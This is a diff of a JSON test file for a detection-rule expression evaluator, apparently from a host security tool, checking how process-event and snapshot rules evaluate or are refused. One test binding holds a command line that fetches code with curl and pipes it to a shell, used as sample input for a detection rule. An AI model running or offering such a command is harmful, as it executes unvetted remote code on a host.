@@ -1,57 +1,236 @@
 [
-  { "name": "startsWith matches a prefix", "kind": "process_event",
+  {
+    "name": "startsWith matches a prefix",
+    "kind": "process_event",
     "expression": "event['process.cwd'].startsWith('/tmp/')",
-    "bindings": { "process.cwd": "/tmp/x" }, "expect": "true" },
-  { "name": "startsWith is not contains", "kind": "process_event",
+    "bindings": {
+      "process.cwd": "/tmp/x"
+    },
+    "expect": "true"
+  },
+  {
+    "name": "startsWith is not contains",
+    "kind": "process_event",
     "expression": "event['process.cwd'].startsWith('/tmp/')",
-    "bindings": { "process.cwd": "/var/tmp/x" }, "expect": "false" },
-  { "name": "endsWith", "kind": "process_event",
+    "bindings": {
+      "process.cwd": "/var/tmp/x"
+    },
+    "expect": "false"
+  },
+  {
+    "name": "endsWith",
+    "kind": "process_event",
     "expression": "event['process.exe'].endsWith('/sh')",
-    "bindings": { "process.exe": "/usr/bin/sh" }, "expect": "true" },
-  { "name": "contains in a command line", "kind": "process_event",
+    "bindings": {
+      "process.exe": "/usr/bin/sh"
+    },
+    "expect": "true"
+  },
+  {
+    "name": "contains in a command line",
+    "kind": "process_event",
     "expression": "event['process.name'] == 'sh' && event['process.cmdline'].contains('curl')",
-    "bindings": { "process.name": "sh", "process.cmdline": "sh -c curl -s http://x | sh" },
-    "expect": "true" },
-  { "name": "empty literal matches everything", "kind": "process_event",
+    "bindings": {
+      "process.name": "sh",
+      "process.cmdline": "sh -c curl -s http://x | sh"
+    },
+    "expect": "true"
+  },
+  {
+    "name": "empty literal matches everything",
+    "kind": "process_event",
     "expression": "event['process.cwd'].startsWith('')",
-    "bindings": { "process.cwd": "/" }, "expect": "true" },
-  { "name": "ancestors list uses in", "kind": "process_event",
+    "bindings": {
+      "process.cwd": "/"
+    },
+    "expect": "true"
+  },
+  {
+    "name": "ancestors list uses in",
+    "kind": "process_event",
     "expression": "'nginx' in event['ancestors.names']",
-    "bindings": { "ancestors.names": ["nginx", "systemd"] }, "expect": "true" },
-  { "name": "integer uid", "kind": "process_event",
+    "bindings": {
+      "ancestors.names": [
+        "nginx",
+        "systemd"
+      ]
+    },
+    "expect": "true"
+  },
+  {
+    "name": "integer uid",
+    "kind": "process_event",
     "expression": "event['process.uid'] == 0",
-    "bindings": { "process.uid": 48 }, "expect": "false" },
-  { "name": "an oversized command line is a boolean rules can use", "kind": "process_event",
+    "bindings": {
+      "process.uid": 48
+    },
+    "expect": "false"
+  },
+  {
+    "name": "an oversized command line is a boolean rules can use",
+    "kind": "process_event",
     "expression": "event['process.name'] == 'sh' && event['process.cmdline_truncated']",
-    "bindings": { "process.name": "sh", "process.cmdline_truncated": true }, "expect": "true" },
-  { "name": "missing parent is unavailable", "kind": "process_event",
+    "bindings": {
+      "process.name": "sh",
+      "process.cmdline_truncated": true
+    },
+    "expect": "true"
+  },
+  {
+    "name": "missing parent is unavailable",
+    "kind": "process_event",
     "expression": "event['parent.name'] == 'nginx'",
-    "bindings": { "process.name": "sh" }, "expect": "unavailable" },
-  { "name": "functions allowed in snapshot rules", "kind": "snapshot",
+    "bindings": {
+      "process.name": "sh"
+    },
+    "expect": "unavailable"
+  },
+  {
+    "name": "functions allowed in snapshot rules",
+    "kind": "snapshot",
     "expression": "facts['os.id'].startsWith('fed')",
-    "bindings": { "os.id": "fedora" }, "expect": "true" },
-  { "name": "non-literal argument refused", "kind": "process_event",
+    "bindings": {
+      "os.id": "fedora"
+    },
+    "expect": "true"
+  },
+  {
+    "name": "non-literal argument refused",
+    "kind": "process_event",
     "expression": "event['process.cwd'].startsWith(event['process.name'])",
-    "bindings": { "process.cwd": "/tmp", "process.name": "sh" }, "expect": "refused" },
-  { "name": "list receiver refused", "kind": "process_event",
+    "bindings": {
+      "process.cwd": "/tmp",
+      "process.name": "sh"
+    },
+    "expect": "refused"
+  },
+  {
+    "name": "list receiver refused",
+    "kind": "process_event",
     "expression": "event['ancestors.names'].contains('nginx')",
-    "bindings": { "ancestors.names": ["nginx"] }, "expect": "refused" },
-  { "name": "integer receiver refused", "kind": "process_event",
+    "bindings": {
+      "ancestors.names": [
+        "nginx"
+      ]
+    },
+    "expect": "refused"
+  },
+  {
+    "name": "integer receiver refused",
+    "kind": "process_event",
     "expression": "event['process.uid'].startsWith('0')",
-    "bindings": { "process.uid": 0 }, "expect": "refused" },
-  { "name": "unknown function refused", "kind": "process_event",
+    "bindings": {
+      "process.uid": 0
+    },
+    "expect": "refused"
+  },
+  {
+    "name": "unknown function refused",
+    "kind": "process_event",
     "expression": "event['process.cmdline'].matches('curl.*')",
-    "bindings": { "process.cmdline": "curl x" }, "expect": "refused" },
-  { "name": "two arguments refused", "kind": "process_event",
+    "bindings": {
+      "process.cmdline": "curl x"
+    },
+    "expect": "refused"
+  },
+  {
+    "name": "two arguments refused",
+    "kind": "process_event",
     "expression": "event['process.cmdline'].contains('a', 'b')",
-    "bindings": { "process.cmdline": "a b" }, "expect": "refused" },
-  { "name": "facts in a process rule refused", "kind": "process_event",
+    "bindings": {
+      "process.cmdline": "a b"
+    },
+    "expect": "refused"
+  },
+  {
+    "name": "facts in a process rule refused",
+    "kind": "process_event",
     "expression": "facts['os.id'] == 'fedora'",
-    "bindings": {}, "expect": "refused" },
-  { "name": "event in a snapshot rule refused", "kind": "snapshot",
+    "bindings": {},
+    "expect": "refused"
+  },
+  {
+    "name": "event in a snapshot rule refused",
+    "kind": "snapshot",
     "expression": "event['process.name'] == 'sh'",
-    "bindings": {}, "expect": "refused" },
-  { "name": "member access still refused", "kind": "process_event",
+    "bindings": {},
+    "expect": "refused"
+  },
+  {
+    "name": "member access still refused",
+    "kind": "process_event",
     "expression": "event.process == 'sh'",
-    "bindings": {}, "expect": "refused" }
+    "bindings": {},
+    "expect": "refused"
+  },
+  {
+    "name": "unknown event key refused",
+    "kind": "process_event",
+    "expression": "event['parent.nmae'] == 'nginx'",
+    "bindings": {},
+    "expect": "refused"
+  },
+  {
+    "name": "worst-case cost over the budget refused (13 calls on the 256 KiB command line)",
+    "kind": "process_event",
+    "expression": "event['process.cmdline'].contains('w0') || event['process.cmdline'].contains('w1') || event['process.cmdline'].contains('w2') || event['process.cmdline'].contains('w3') || event['process.cmdline'].contains('w4') || event['process.cmdline'].contains('w5') || event['process.cmdline'].contains('w6') || event['process.cmdline'].contains('w7') || event['process.cmdline'].contains('w8') || event['process.cmdline'].contains('w9') || event['process.cmdline'].contains('w10') || event['process.cmdline'].contains('w11') || event['process.cmdline'].contains('w12')",
+    "bindings": {},
+    "expect": "refused"
+  },
+  {
+    "name": "bytes literal argument refused",
+    "kind": "process_event",
+    "expression": "event['process.cmdline'].contains(b'x')",
+    "bindings": {},
+    "expect": "refused"
+  },
+  {
+    "name": "raw string argument refused",
+    "kind": "process_event",
+    "expression": "event['process.cmdline'].contains(r'x')",
+    "bindings": {},
+    "expect": "refused"
+  },
+  {
+    "name": "triple-quoted argument refused",
+    "kind": "process_event",
+    "expression": "event['process.cmdline'].contains('''x''')",
+    "bindings": {},
+    "expect": "refused"
+  },
+  {
+    "name": "non-literal index refused",
+    "kind": "process_event",
+    "expression": "event[event['process.name']] == 'x'",
+    "bindings": {},
+    "expect": "refused"
+  },
+  {
+    "name": "global function form refused",
+    "kind": "process_event",
+    "expression": "contains(event['process.cmdline'], 'x')",
+    "bindings": {},
+    "expect": "refused"
+  },
+  {
+    "name": "boolean receiver refused",
+    "kind": "process_event",
+    "expression": "event['process.cmdline_truncated'].contains('x')",
+    "bindings": {},
+    "expect": "refused"
+  },
+  {
+    "name": "string on the right of in refused",
+    "kind": "process_event",
+    "expression": "'curl' in event['process.cmdline']",
+    "bindings": {},
+    "expect": "refused"
+  },
+  {
+    "name": "size refused",
+    "kind": "process_event",
+    "expression": "size(event['process.cmdline']) > 3",
+    "bindings": {},
+    "expect": "refused"
+  }
 ]
